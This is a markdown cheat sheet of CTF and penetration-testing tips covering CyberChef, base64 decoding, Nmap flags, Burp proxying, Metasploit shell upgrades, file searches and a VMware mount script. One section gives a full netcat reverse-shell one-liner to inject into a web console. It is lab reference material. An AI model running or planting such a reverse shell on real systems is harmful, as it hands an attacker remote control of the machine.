# General tips and tricks

## General CTF data analysis \(encoding, hash identifier, etc.\) <a id="general-ctf-data-analysis-encoding-hash-identifier-etc"></a>

```text
https://gchq.github.io/CyberChef/
```

## Disposable email <a id="disposable-email"></a>

If you are signing up for a lot of accounts you can use a disposable email. You just enter the email account you want for that second, and then you can view it. But remember, so can everyone else.  
[https://www.mailinator.com](https://www.mailinator.com/)

## Base64 encode/decode <a id="base64-encodedecode"></a>

```text
import base64

encoded = base64.b64encode("String to encode")
print encoded

decoded = base64.b64decode("aGVqc2Fu")
print decoded
```

## Quick Base64 Decoder <a id="quick-base64-decoder"></a>

```text
echo aGVsbG8gd2hpdGUgaGF0Cg== | base64 -d
```

```text
db_rebuild_cache
```

## Default passwords <a id="default-passwords"></a>

[http://www.defaultpassword.com/](http://www.defaultpassword.com/)

## Getting GUI on machine that does not have RDP or VNC <a id="getting-gui-on-machine-that-does-not-have-rdp-or-vnc"></a>

You can forward X over SSH.  
[http://www.vanemery.com/Linux/XoverSSH/X-over-SSH2.html](http://www.vanemery.com/Linux/XoverSSH/X-over-SSH2.html)

In metasploit framework, if we have a shell \( you should try this also, when you are trying to interact with a shell and it dies \(happened in a VM\), we can upgrade it to meterpreter by using sessions -u

```text
sessions -h
Usage: sessions [options]

Active session manipulation and interaction.

OPTIONS:

-u <opt>  Upgrade a shell to a meterpreter session on many platforms
```

```text
In the RHOSTS field enter:

file://PATHTOIPADDRESSES
```

## **Change Nmap modes while scanning** <a id="change-nmap-modes-while-scanning"></a>

```text
v   --increase verbosity
p   --turn on packets
```

## **Nmap host enumeration** <a id="nmap-host-enumeration"></a>

```text
-sn --determine alive hosts
```

## Issues with Exploits \(try viewing in Burp\) <a id="issues-with-exploits-try-viewing-in-burp"></a>

```text
Options->Add(proxy Listeners)->
Bind to port (i.e.local port to bind)(e.g.8500)->
Request Handling->
Redirect to host(i.e.IP of target)(e.g.8500)->
Redirect to port(i.e.Port of target)(e.g.8500)

then browser
localhost:8500
or run the exploit again
```

## Quick determination if executables exist <a id="quick-determination-if-executables-exist"></a>

```text
which nc
```

## Makes Sure shells don't hang \(send to background\) <a id="makes-sure-shells-dont-hang-send-to-background"></a>

```text
If adding a reverse shell to web console for example, add a "&" to the end of reverse shell, to send to background
and in case any process during interaction hangs
for example:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f &
```

## Modification of Files \(CTF specific / IR trick\) <a id="modification-of-files-ctf-specific--ir-trick"></a>

look for other files modified after initial flag file or other indicator

```text
find / -type f -newermt 2017-08-20 ! -newermt 2017-08-24 2>/dev/null
```

**Note:** 2&gt;/dev/null hides all permission denied error messages

above example the user flag was uploaded aug 22 2017

## Remove white space from a file <a id="remove-white-space-from-a-file"></a>

In order to wipe all whitespace including newlines you can try:

```text
cat file.txt | tr -d " \t\n\r"
```

You can also use the character classes defined by tr

```text
cat file.txt | tr -d "[:space:]"
```

For example, in order to wipe just horizontal white space:

```text
cat file.txt | tr -d "[:blank:]"
```

```text
root@kali:~/Desktop# cat mount-shared-folders.sh 
#!/bin/bash

vmware-hgfsclient | while read folder; do
  echo "[i] Mounting ${folder}   (/mnt/hgfs/${folder})"
  mkdir -p "/mnt/hgfs/${folder}"
  umount -f "/mnt/hgfs/${folder}" 2>/dev/null
  vmhgfs-fuse -o allow_other -o auto_unmount ".host:/${folder}" "/mnt/hgfs/${folder}"
done

sleep 2s
```

